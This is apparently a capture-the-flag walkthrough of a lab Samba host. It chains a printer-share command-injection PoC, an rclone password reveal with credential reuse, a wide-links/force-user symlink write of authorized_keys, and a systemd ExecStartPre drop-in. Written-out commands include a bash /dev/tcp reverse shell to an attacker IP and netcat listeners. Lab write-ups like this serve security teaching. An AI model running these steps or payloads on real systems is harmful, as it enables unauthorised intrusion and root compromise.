Samba 4 exposed on ports 139/445 with **null-session-enumerable shares** — `HP-Reception` (a printer share), `projects`, and `transfer` — belonging to "Hartley Group". The `HP-Reception` share is exploited via **CVE-2026-4480**, an unauthenticated command injection in Samba's print-job processing pipeline, yielding a reverse shell as the guest user `nobody`. Post-foothold discovery of `/opt/offsite-backup/rclone.conf` reveals an obfuscated SFTP backup password; `rclone reveal` decodes it to `iXzvcib3SrpZ`, which turns out to be reused as `scott`'s OS password and grants the user flag. Lateral movement from `scott` to `marcus` abuses the `[transfer]` Samba share's combination of `wide links = yes` (permitting symlink traversal outside the share) plus `force user = marcus` (executing writes as marcus regardless of the SMB-authenticated user): a symlink to `/home/marcus/` followed by an SMB-side `mkdir .ssh` and `put authorized_keys` writes scott's public key into marcus's home as marcus, granting SSH access. Privilege escalation exploits the `operators` group's write ownership of `/etc/systemd/system/smbd.service.d/` — a systemd drop-in directory — where dropping a `config.conf` with `ExecStartPre=/bin/bash -c '<reverse shell>'` and restarting smbd fires the payload as root because the smbd service runs as root.

## Reconnaissance & Enumeration

The objective of this phase was to enumerate exposed services and identify any anonymously-reachable attack surface.

### Host Discovery

Reachability and an OS hint via ICMP:

```bash
ping -c 1 10.129.64.126
PING 10.129.64.126 (10.129.64.126) 56(84) bytes of data.
64 bytes from 10.129.64.126: icmp_seq=1 ttl=63 time=47.6 ms
```

A TTL of 63 indicates a Linux host (default 64, decremented once across the routing hop).

### SMB share enumeration — NULL session

Samba's default behaviour is to permit anonymous (NULL) session connections for share enumeration, even when no shares themselves are anonymously readable. `smbmap` uses this to list the available shares without credentials:

```bash
smbmap -H 10.129.64.126
[+] IP: 10.129.64.126:445    Name: 10.129.64.126        Status: NULL Session
    Disk                                        Permissions    Comment
    ----                                        -----------    -------
    HP-Reception                                NO ACCESS      Reception printer
    projects                                    NO ACCESS      Hartley Group Project Files
    transfer                                    NO ACCESS      Staff file transfer
    IPC$                                        NO ACCESS      IPC Service (Hartley Group Document Services)
```

Four shares. The `NO ACCESS` label means the NULL session cannot read the shares' contents, but the share names, comments, and existence are all disclosed — the standard "leak through metadata" pattern. Two details are worth carrying forward: the shares belong to a company called **Hartley Group**, and one share is titled **`HP-Reception`** with the comment "Reception printer".

The word "printer" in a Samba context is a red flag. Samba's printer-share support has a long history of vulnerabilities — the `print command` and job-processing pipeline is executed on the server and has repeatedly been the target of command-injection bugs. Version-specific research surfaced **CVE-2026-4480**, a recent Samba printer share vulnerability with a public proof of concept.

## Exploitation — CVE-2026-4480 (Samba Printer Share Command Injection)

### Understanding the vulnerability

Samba printer shares are configured with a `print command` directive that specifies the OS command Samba invokes when a client submits a print job. Standard configurations use printf-style substitution tokens like `%J` (job name), `%s` (spool file path), and `%p` (printer name) — all of which are attacker-controllable through the SMB print-job submission protocol. If the printer-processing pipeline passes these substitutions to a shell without escaping, submitting a print job with a metacharacter-laden job name yields command execution on the Samba server.

CVE-2026-4480 is the recurrence of this class of bug in a specific print job handling path. The vulnerability is exploitable **without authentication** because printer shares in Samba are conventionally configured with `guest ok = yes` (as is the case here — the share config later confirmed `printable = yes` and `guest ok = yes`). Any SMB client that can reach 445/tcp can submit a print job, and any submitted job triggers the command-injection sink.

### Running the public PoC

The public exploit at [`github.com/TheCyberGeek/CVE-2026-4480-PoC`](https://github.com/TheCyberGeek/CVE-2026-4480-PoC) handles the SMB print-job submission with the malicious job metadata. A netcat listener on the attacker box first:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
```

Then the exploit:

```bash
python3 exploit.py 10.129.64.126 <ATTACKER_IP> 4444
[*] target   : 10.129.64.126 (\\10.129.64.126\HP-Reception)
[*] callback : <ATTACKER_IP>:4444  (start a listener first: nc -lvnp 4444)
[+] print job submitted -- check your listener / out-of-band channel
```

The listener caught the callback as `nobody`, the standard Samba guest account, in the spool directory:

```text
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.64.126 43998
bash: cannot set terminal process group (1814): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$
```

A standard TTY upgrade (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) made the shell usable.

## Lateral Movement — `nobody` → `scott`

### Enumerating the system users

The reflex first check after an unauthenticated foothold is to enumerate the actual login users:

```bash
cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
scott:x:1000:1001:Scott Mercer:/home/scott:/bin/bash
marcus:x:1001:1002:Marcus Vale:/home/marcus:/bin/bash
```

Two non-root users: `scott` and `marcus`. Both are named after real people ("Scott Mercer", "Marcus Vale") consistent with the Hartley Group corporate theme.

### The rclone config leak

Exploring the filesystem for accidentally-readable configuration surfaced an offsite backup directory:

```bash
cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

A ready-made SFTP config for backing up to an internal host. The `user` is a service account (`svc-backup`), the `pass` looks encrypted or hashed — 42 characters of mixed case and dashes, no obvious base64 or hex structure. But it's actually neither encrypted nor hashed.

### `rclone reveal` — obfuscation is not encryption

rclone stores passwords in its config in an **obfuscated** format, not an encrypted one. The distinction is critical: the obfuscation is a symmetric transformation using a **fixed, hardcoded key baked into the rclone binary**. Anyone with a copy of rclone can reverse the transformation. rclone even ships with a subcommand for exactly this: `rclone reveal`.

```bash
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
```

The plaintext SFTP password: `iXzvcib3SrpZ`. The purpose of the obfuscation is to prevent accidental disclosure through casual eyeballing (backup admins looking at config files in their editor), not to protect against an attacker who possesses the config file.

### Password reuse — SFTP service account → OS user

`svc-backup` is not a user on this system (it exists on `backup.hartley-group.internal`, a different host mentioned in the config). But a password chosen by the operator who provisioned the backup may well have been chosen once and reused across their identities. Testing the recovered plaintext against both OS-side login users:

```bash
su scott
Password: iXzvcib3SrpZ
scott@abducted:~$ cat /home/scott/user.txt
```

`scott:iXzvcib3SrpZ` works. The operator who set up the SFTP backup account picked a password once and reused it for their own local OS login — the same corporate-scale credential-reuse pattern that appears in engagement after engagement.

## Lateral Movement — `scott` → `marcus` (Samba wide links + force user)

### Reading the Samba configuration as scott

The `/etc/samba/smb.conf` includes an important global setting:

```bash
cat /etc/samba/smb.conf
[global]
   workgroup = WORKGROUP
   server string = Hartley Group Document Services
   netbios name = ABDUCTED
   map to guest = Bad User
   guest account = nobody
   security = user
   printing = sysv
   load printers = no
   disable spoolss = no
   unix extensions = no
   allow insecure wide links = yes
   log level = 0
   include = /etc/samba/shares.conf
```

Two settings matter. The `include = /etc/samba/shares.conf` line means the actual share definitions live in a separate file. And **`allow insecure wide links = yes`** enables the specific feature that will make the privesc primitive work.

The share file:

```bash
cat /etc/samba/shares.conf
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

The `[transfer]` share is the entire privesc primitive laid out in four lines:

- **`path = /srv/transfer`** — the base directory of the share
- **`valid users = scott`** — only scott can authenticate to the share
- **`force user = marcus`** — every filesystem operation performed through this share happens as the user `marcus`, regardless of who authenticated
- **`wide links = yes`** — Samba will follow symbolic links whose targets fall outside the share's base directory (normally forbidden as a security measure, hence the `allow insecure wide links = yes` global override needed to enable it)

The combination is the exploit. As `scott`, place a symbolic link inside `/srv/transfer/` pointing at `/home/marcus/`. When scott connects to the share over SMB, Samba resolves the symlink (because `wide links = yes`), reaches `/home/marcus/`, and then performs writes there **as marcus** (because `force user = marcus`). The result: scott gets write access to marcus's home directory, with marcus's ownership on the created files.

The specific write target is `/home/marcus/.ssh/authorized_keys` with scott's public key inside. Once written, scott can SSH to `marcus@127.0.0.1` using his own private key, effectively hopping identities without needing marcus's password.

### Setting up the key pair

Generating an ED25519 keypair for scott to use in the SSH login:

```bash
ssh-keygen -t ed25519 -N '' -f /home/scott/.ssh/id_ed25519
Generating public/private ed25519 key pair.
Your identification has been saved in /home/scott/.ssh/id_ed25519
Your public key has been saved in /home/scott/.ssh/id_ed25519.pub

cat /home/scott/.ssh/id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFUzAzaBZpsIJ/aEtqhGgZQUsLDTZCkDRaE/Evi35o6b scott@abducted
```

### The symlink to marcus's home

First attempt targeted `/home/marcus/.ssh` directly, but that directory did not yet exist:

```bash
cd /srv/transfer
ln -s /home/marcus/.ssh /srv/transfer/sshdir

smbclient //127.0.0.1/transfer -U scott
Password for [WORKGROUP\scott]: iXzvcib3SrpZ
smb: \> dir
  .                                   D        0  Wed Jul 29 10:32:51 2026
  ..                                  D        0  Wed Jul 29 10:32:51 2026
```

The symlink appears empty from SMB's perspective — because the target directory `/home/marcus/.ssh` doesn't exist yet, following the symlink and listing its contents returns nothing. The fix is to point the symlink at `/home/marcus/` itself (which does exist), then create `.ssh` from inside SMB (which will be created as marcus):

```bash
rm /srv/transfer/sshdir
ln -s /home/marcus/ /srv/transfer/marcus
```

### Writing authorized_keys as marcus over SMB

Now the actual write, done through smbclient. The mkdir and the put operation both execute with marcus's UID:

```bash
smbclient //127.0.0.1/transfer -U scott
Password for [WORKGROUP\scott]: iXzvcib3SrpZ
smb: \> dir
  .                                   D        0  Wed Jul 29 10:36:07 2026
  ..                                  D        0  Wed Jul 29 10:36:07 2026
  marcus                              D        0  Thu Jun  4 13:47:57 2026

smb: \> cd marcus\
smb: \marcus\> dir
  .                                   D        0  Thu Jun  4 13:47:57 2026
  ..                                  D        0  Thu Jun  4 13:41:30 2026
  .profile                            H      807  Sun Mar 31 08:41:03 2024
  .bash_logout                        H      220  Sun Mar 31 08:41:03 2024
  .bash_history                       H        0  Thu Jun  4 13:47:57 2026
  .bashrc                             H     3771  Sun Mar 31 08:41:03 2024
  .cache                             DH        0  Thu Jun  4 13:41:30 2026

smb: \marcus\> mkdir .ssh
smb: \marcus\> cd .ssh
smb: \marcus\.ssh\> put /home/scott/.ssh/id_ed25519.pub authorized_keys
putting file /home/scott/.ssh/id_ed25519.pub as \marcus\.ssh\authorized_keys (46.9 kb/s)
```

The `dir` output when descending into `marcus/` shows real files from marcus's home (`.profile`, `.bashrc`, etc.) — confirming the symlink is being followed. `mkdir .ssh` creates `/home/marcus/.ssh` with marcus's ownership; `put` writes `authorized_keys` inside, also as marcus. SSHD's strict permission checks on `~/.ssh/` and `authorized_keys` are satisfied automatically because Samba created both as marcus.

### SSH login as marcus

The prepared key gives instant access:

```bash
ssh -i /home/scott/.ssh/id_ed25519 marcus@127.0.0.1
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)
[...]
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1003(operators)
```

Note the `operators` group in marcus's group membership — that's the pivot into the privesc.

## Privilege Escalation — `marcus` → `root` (systemd drop-in in operators group)

### Enumerating operators-group-owned paths

marcus's group membership includes `operators`. The obvious question is what does that group own on the filesystem:

```bash
find / -group "operators" 2>/dev/null
/etc/systemd/system/smbd.service.d
```

A single hit — and it's a directory under `/etc/systemd/system/`. This is a **systemd drop-in directory**, a well-known mechanism for adding configuration to existing service units without editing the original unit file. Any `.conf` file placed inside `<service>.service.d/` is merged into the effective unit at load time.

```bash
ls -la /etc/systemd/system/smbd.service.d
drwxrwxr-x 2 root operators 4096 Jul 29 10:32 .
```

Group-writable, owned by operators. marcus (a member of the group) can create files here. The `smbd` service is the target of the drop-in — which means every parameter of how smbd runs, including any command that runs at service start, is under marcus's control.

### The ExecStartPre injection

systemd's `[Service]` section supports directives like `ExecStart`, `ExecStartPre`, `ExecStartPost`, `ExecStop`, and `ExecReload` — each of which specifies commands to run at the corresponding phase of the service lifecycle. Commands run under the same user account as the main service. **smbd runs as root**, so any command in any of those directives fires as root when the service is (re)started.

Writing the drop-in:

```bash
cat > /etc/systemd/system/smbd.service.d/config.conf <<'EOF'
[Service]
ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
EOF
```

A single line under `[Service]` adds a pre-start hook that spawns a reverse shell. The choice of `ExecStartPre` over `ExecStart` matters: `ExecStart` would replace smbd's actual startup command, breaking the service; `ExecStartPre` prepends to the existing sequence, so smbd still starts normally after the hook fires. Making the privesc silent from an admin monitoring perspective.

### Firing the payload

systemd caches unit files at load time; a fresh `.conf` in a drop-in directory is only picked up after `systemctl daemon-reload`. Then the service must be restarted to trigger the new hook. A netcat listener on the attacker box first:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
```

And on the marcus session:

```bash
systemctl daemon-reload
systemctl restart smbd
```

The listener caught the callback as root:

```text
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.64.126 35866
bash: cannot set terminal process group (3199): Inappropriate ioctl for device
bash: no job control in this shell
root@abducted:/# whoami
root
root@abducted:/# cat /root/root.txt
```

The `ExecStartPre` hook fired before smbd's own startup logic, spawning bash with root credentials and connecting back to the listener. smbd then completed its normal startup sequence and served SMB as usual — no service interruption an admin would notice.

## Key Takeaways

- **NULL-session share enumeration is Samba's default and it leaks metadata reliably.** Even when no share is anonymously readable, the list of shares, their comments, and their existence are disclosed. Comments in particular are curated by administrators to describe the share's purpose, which means they routinely include departmental context ("Reception printer", "Hartley Group Project Files"), organisational branding, and the internal service naming conventions an attacker uses to map the environment. Turning off NULL-session enumeration is a config change (`restrict anonymous = 2` on Windows; explicit share ACLs on Samba); very few deployments do.
- **The word "printer" in a Samba context is a red flag.** Samba's printer-share machinery has a decades-long history of command-injection vulnerabilities in the `print command`, `lpq command`, `lprm command`, and job-processing paths — attacker-controllable job metadata (like `%J` job name) has been repeatedly funnelled into shells without escaping. When a Samba deployment exposes a printer share, especially with `guest ok = yes`, the current CVE-list for that Samba version should be the first thing checked.
- **rclone's password format is obfuscation, not encryption.** rclone uses a **hardcoded symmetric key baked into the binary** to XOR-scramble the config-file passwords. The stated purpose in rclone's documentation is to prevent casual disclosure, not to defend against an attacker who has read access to the config. `rclone reveal <string>` reverses the transformation trivially. When a config file for rclone, `chpasswd`, `pwd.tools`-style obfuscators, or any of the countless "encrypted config" tools shows up in an engagement, the assumption should be "the encoding is public knowledge" until proven otherwise.
- **Password reuse crosses account boundaries within a single operator.** The rclone config held a password for the SFTP service account `svc-backup`, which does not exist on this host at all — but the same password worked for the local OS user `scott`. Operators pick a password once and reuse it across every identity they manage (the SFTP service account, the local login, the email, the wiki). Any recovered credential should be tested against every enumerated user, not just the one whose name matches the config's `user` field.
- **Samba's `force user` + `wide links` combination is a supported feature that becomes a privesc primitive under trivial misconfiguration.** `force user` is a legitimate way to normalise ownership on multi-user shares (all files owned by a service account regardless of who wrote them); `wide links` is a legitimate way to expose targeted directories outside the share. Individually, each is defensible; combined, they let any authenticated SMB user with write access to the share write anywhere the `force user` account can write, by pointing symlinks at other locations. The primitive turns cleanly into `authorized_keys` injection whenever `force user` names a login-shell account.
- **Symbolic links + `mkdir` over SMB write as the effective user, not as the SMB client.** The critical detail in the exploitation flow was that neither the symlink resolution (which happens Samba-side) nor the directory creation (which happens as the `force user`-designated identity) required scott to have any prior filesystem access to `/home/marcus/`. Samba executed both operations with marcus's credentials because the config told it to. Any control primitive that ends "and Samba writes to this path as user X" is functionally equivalent to being user X for that write.
- **`~/.ssh/authorized_keys` write is the standard universal terminal state for arbitrary-file-write primitives on Linux.** Whenever an engagement reaches an arbitrary-file-write primitive — via symlink, via cron, via a systemd drop-in, via wildcard sudo — the fastest cash-in is planting a public key in the target user's `~/.ssh/authorized_keys`. It creates a persistent authentication that survives reboots, doesn't require an interactive shell during exploitation, and integrates with normal admin workflows so it doesn't stand out. sshd's own strict permission checks (`.ssh` must be 700, `authorized_keys` must be readable only by the owner) are trivially satisfied when the write primitive creates the file as the target user.
- **Systemd drop-in directories are unit files by proxy.** `<service>.service.d/*.conf` files are merged into the effective service unit at daemon-reload time. Anyone with write access to a drop-in directory has, for practical purposes, write access to how the corresponding service runs — including which user it runs as, what commands it executes at startup, what environment variables it sees, and what capabilities it has. `find / -type d -writable -path "*/systemd*"` after any foothold is a cheap check that pays off in the "over-permissive service directory" scenario that Abducted models exactly.
- **`ExecStartPre` is the quietest injection point in a systemd drop-in.** Overwriting `ExecStart` breaks the service and gets noticed; injecting `ExecStartPre` prepends a hook that runs before the normal startup sequence, so the service still starts normally after the payload fires. From an admin's monitoring perspective, everything looks fine — smbd is running, its ports are listening, its logs continue to accumulate. The only anomaly is a bash process that briefly ran as root during startup, which most host-based EDR won't correlate with the service unit unless it's specifically watching drop-in directories.
- **Group ownership on system directories is a persistent privilege delegation.** The `operators` group owning `/etc/systemd/system/smbd.service.d/` was likely a well-intentioned decision — let the operations team manage smbd tuning without root — that ignored the security consequence that "manage smbd tuning" and "execute arbitrary root commands via ExecStartPre" are the same capability. When engineering delegates administrative surface via group ownership, the correct question is not "who do we trust to configure this" but "what actions does write access to this path grant in principle".
